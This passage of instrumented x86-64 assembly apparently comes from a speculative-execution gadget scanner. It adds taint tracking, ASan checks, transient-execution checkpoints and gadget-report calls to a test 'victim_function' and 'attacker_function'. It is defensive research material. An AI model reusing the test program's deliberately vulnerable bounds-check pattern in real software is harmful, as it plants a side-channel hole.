            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___473

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rax
            orb %r15b,(dift_reg_tags)(%rax)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___473:

            nop
            movq (scratchpad+524288),%rbx
            movl (array_size)(%rip),%eax
            xorl %r15d,%r15d
            orb (dift_reg_tags),%r15b
            orb (dift_reg_tags+8),%r15b
            testb $48,%r15b
            je .L__check_ok__teapot___474

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r15,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___474:

            nop
            movq (instruction_cnt),%r15
            addq $3,%r15
            cmpq $250,%r15
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r15,(instruction_cnt)
            cmpl %r8d,%eax
            leaq (.__trampoline__73454647_e019_4b26_ac47_096045cba6c2__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___476)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__73454647_e019_4b26_ac47_096045cba6c2__teapot__)(%rip),%r15
            movq %r15,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___476:

            nop
            jae .L_1734__teapot__
.L_170f__teapot__:
.L__trampoline_target__d17a78f8_0b4a_470d_ba38_5bd43afed7ce__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $91,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq (%r13),%rsi
            xorq %rdi,%rdi
            orb (dift_reg_tags+13),%dil
            testb $48,%dil
            je .L__attacker_tags_check__teapot___478

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___478:

            testb $2,%dil
            je .L__asan_check__teapot___478

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $15,(dift_reg_queued_id)
.L__asan_check__teapot___478:

            movq %rsi,%r15
            shrq $3,%r15
            movb 2147450880(%r15),%r15b
            testb %r15b,%r15b
            je .L__mem_operand_policy_done__teapot___478
.L__asan_check_fail__teapot___478:

            testb $1,%dil
            je .L__asan_check_fail_non_attacker__teapot___478
.L__asan_check_fail_attacker__teapot___478:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $15,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___478
.L__asan_check_fail_non_attacker__teapot___478:

            orb $2,(dift_reg_queued_tag)
            movb $15,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___478:

            nop
            leaq (%r13),%rdi
            btcq $45,%rdi
            xorl %r15d,%r15d
            orb (dift_reg_tags+13),%r15b
            orb (%rdi),%r15b
            movb %r15b,(dift_reg_tags+15)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___479

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rsi
            orb %r15b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___479:

            nop
            movq (%r13),%r15
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___480:

            nop
            movl %ebx,%esi
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            orb (dift_reg_tags+15),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___481:

            nop
            movq (scratchpad+524288),%rax
            movq %r15,%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq realloc@PLT
.L__ret_transform_target_victim_function__cb1729f6_691e_4b83_ad86_0c6f9a6d3b45__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $87,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            movb %dl,(dift_reg_tags+5)
.L__dift_done__teapot___485:

            nop
            movq %rax,%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %esi,%esi
            orb (dift_reg_tags+13),%sil
            orb (dift_reg_tags),%sil
            leaq (%r13),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rdx
            imulq %rdx,%rsi
            movq (memory_history_top),%rax
            movq (%rbx),%rdx
            movq %rbx,(%rax)
            movq %rdx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rsi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___486:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq (%r13),%rdx
            movq (memory_history_top),%rax
            movq (%rdx),%rsi
            movq %rdx,(%rax)
            movq %rsi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524288),%rax
            movq %rax,(%r13)
            leaq (array_size)(%rip),%rax
            btcq $45,%rax
            xorl %esi,%esi
            orb (%rax),%sil
            movb %sil,(dift_reg_tags+3)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___488

            movb (dift_reg_queued_tag),%sil
            movzbq (dift_reg_queued_id),%rdx
            orb %sil,(dift_reg_tags)(%rdx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___488:

            nop
            movl (array_size)(%rip),%edx
            movl %edx,%edx
            xorl %esi,%esi
            orb (dift_reg_tags+15),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___489:

            nop
            movq %r15,%rsi
            movq %rbx,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%r15
            movq %rax,(%rbx)
            movq %r15,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq memcpy__dift_wrapper__@PLT
.L__ret_transform_target_victim_function__083f6fe9_11da_4735_995b_57df6ce2b8d7__teapot__:
.L_1734__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $89,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movl %ebx,%ebx
            xorl %eax,%eax
            orb (dift_reg_tags+12),%al
            movb %al,(dift_reg_tags+3)
.L__dift_done__teapot___493:

            nop
            movl %r12d,%edx
            cmpq %rbx,%rdx
            sbbq %rdx,%rdx
            xorl %ebx,%ebx
            orb (dift_reg_tags+12),%bl
            orb (dift_reg_tags+3),%bl
            movb %bl,(dift_reg_tags+3)
.L__dift_done__teapot___494:

            nop
            andl %r12d,%edx
            leaq (%r13),%r15
            xorq %r12,%r12
            orb (dift_reg_tags+13),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___495

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___495:

            testb $2,%r12b
            je .L__asan_check__teapot___495

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___495:

            movq %r15,%rbx
            shrq $3,%rbx
            movb 2147450880(%rbx),%bl
            testb %bl,%bl
            je .L__mem_operand_policy_done__teapot___495
.L__asan_check_fail__teapot___495:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___495
.L__asan_check_fail_attacker__teapot___495:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___495
.L__asan_check_fail_non_attacker__teapot___495:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___495:

            nop
            leaq (%r13),%r12
            btcq $45,%r12
            xorl %ebx,%ebx
            orb (dift_reg_tags+13),%bl
            orb (%r12),%bl
            movb %bl,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___496

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%r15
            orb %bl,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___496:

            nop
            movq (%r13),%rax
            leaq (%rax,%rdx),%r15
            xorq %r12,%r12
            orb (dift_reg_tags),%r12b
            orb (dift_reg_tags+3),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___497

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___497:

            testb $2,%r12b
            je .L__asan_check__teapot___497

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__asan_check__teapot___497:

            movq %r15,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___497

            movb %r15b,%bl
            andb $7,%bl
            cmpb %r13b,%bl
            jl .L__mem_operand_policy_done__teapot___497
.L__asan_check_fail__teapot___497:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___497
.L__asan_check_fail_attacker__teapot___497:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___497
.L__asan_check_fail_non_attacker__teapot___497:

            orb $2,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___497:

            nop
            leaq (%rax,%rdx),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            orb (dift_reg_tags+3),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+2)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___498

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%r15
            orb %r13b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___498:

            nop
            movzbl (%rax,%rdx),%ecx
            xorl %r15d,%r15d
            orb (dift_reg_tags+2),%r15b
            orb (dift_reg_tags+14),%r15b
            movb %r15b,(dift_reg_tags+14)
.L__dift_done__teapot___499:

            nop
            imull %ecx,%r14d
            xorl %r15d,%r15d
            orb (dift_reg_tags+7),%r15b
            orb (dift_reg_tags+14),%r15b
            movb %r15b,(dift_reg_tags+7)
.L__dift_done__teapot___500:

            nop
            addq %r14,%rbp
            leaq (%rbp),%r15
            xorq %r12,%r12
            orb (dift_reg_tags+7),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___501

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___501:

            testb $2,%r12b
            je .L__asan_check__teapot___501

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $7,(dift_reg_queued_id)
.L__asan_check__teapot___501:

            movq %r15,%r14
            shrq $3,%r14
            movb 2147450880(%r14),%r14b
            testb %r14b,%r14b
            je .L__mem_operand_policy_done__teapot___501

            movb %r15b,%r13b
            andb $7,%r13b
            cmpb %r14b,%r13b
            jl .L__mem_operand_policy_done__teapot___501
.L__asan_check_fail__teapot___501:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___501
.L__asan_check_fail_attacker__teapot___501:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $7,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___501
.L__asan_check_fail_non_attacker__teapot___501:

            orb $2,(dift_reg_queued_tag)
            movb $7,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___501:

            nop
            leaq (%rbp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (dift_reg_tags+7),%r14b
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___502

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___502:

            nop
            movb (%rbp),%bpl
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags)
.L__dift_done__teapot___503:

            nop
            movl $0,%eax
            addq $8,%rsp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___504

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___504:

            nop
            popq %rbx
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___505

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___505:

            nop
            popq %rbp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r15d,%r15d
            orb (%r12),%r15b
            movb %r15b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___506

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%r13
            orb %r15b,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___506:

            nop
            popq %r12
            leaq (%rsp),%r13
            btcq $45,%r13
            xorl %r14d,%r14d
            orb (%r13),%r14b
            movb %r14b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___507

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___507:

            nop
            popq %r13
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r14d,%r14d
            orb (%rax),%r14b
            movb %r14b,(dift_reg_tags+14)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___508

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___508:

            nop
            movq (scratchpad+524288),%rax
            popq %r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r15d,%r15d
            orb (%rax),%r15b
            movb %r15b,(dift_reg_tags+15)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___509

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rbx
            orb %r15b,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___509:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %r15
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $19,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___512

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___512:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size victim_function__teapot__, . - victim_function__teapot__
attacker_function__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rsp,%rcx
            shrq $3,%rcx
            leaq 2147450880(%rcx),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rcx)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $62,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            xorl %eax,%eax
            orb (dift_reg_tags+15),%al
            leaq -8(%rsp),%rcx
            btcq $45,%rcx
            movabsq $72340172838076673,%rdx
            imulq %rdx,%rax
            movq (memory_history_top),%rbx
            movq (%rcx),%rdx
            movq %rcx,(%rbx)
            movq %rdx,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %rax,(%rcx)
            addq $8,%rcx
.L__dift_done__teapot___515:

            nop
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            pushq %r15
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            xorl %r15d,%r15d
            orb (dift_reg_tags+14),%r15b
            leaq -8(%rsp),%rcx
            btcq $45,%rcx
            movabsq $72340172838076673,%rax
            imulq %rax,%r15
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %r15,(%rcx)
            addq $8,%rcx
.L__dift_done__teapot___517:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rbx,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%r15
            movq %rax,(%rbx)
            movq %r15,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524288),%rbx
            pushq %r14
            movq %rbx,(scratchpad+524288)
            xorl %r14d,%r14d
            orb (dift_reg_tags+13),%r14b
            leaq -8(%rsp),%rax
            btcq $45,%rax
            movabsq $72340172838076673,%r15
            imulq %r15,%r14
            movq (memory_history_top),%rbx
            movq (%rax),%r15
            movq %rax,(%rbx)
            movq %r15,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq %r14,(%rax)
            addq $8,%rax
.L__dift_done__teapot___519:

            nop
            movq (scratchpad+524288),%rbx
            leaq -8(%rsp),%r15
            movq (memory_history_top),%rax
            movq (%r15),%r14
            movq %r15,(%rax)
            movq %r14,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            pushq %r13
            xorl %r14d,%r14d
            orb (dift_reg_tags+12),%r14b
            leaq -8(%rsp),%rax
            btcq $45,%rax
            movabsq $72340172838076673,%r15
            imulq %r15,%r14
            movq (memory_history_top),%r13
            movq (%rax),%r15
            movq %rax,(%r13)
            movq %r15,8(%r13)
            leaq 16(%r13),%r13
            movq %r13,(memory_history_top)
            movq %r14,(%rax)
            addq $8,%rax
.L__dift_done__teapot___521:

            nop
            leaq -8(%rsp),%rax
            movq (memory_history_top),%r13
            movq (%rax),%r15
            movq %rax,(%r13)
            movq %r15,8(%r13)
            leaq 16(%r13),%r13
            movq %r13,(memory_history_top)
            pushq %r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+7),%r13b
            leaq -8(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___523:

            nop
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbp
            xorl %r13d,%r13d
            orb (dift_reg_tags+1),%r13b
            leaq -8(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___525:

            nop
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbx
            subq $2168,%rsp
            leaq %fs:40,%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___527

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___527:

            nop
            movq %fs:40,%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (dift_reg_tags),%r13b
            leaq 2152(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___528:

            nop
            leaq 2152(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,2152(%rsp)
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags)
.L__dift_done__teapot___530:

            nop
            xorl %eax,%eax
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $12,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            callq array_init__teapot__
.L__ret_transform_target_attacker_function__8a273969_4093_499e_9dc6_a0f66c7471d8__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $17,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
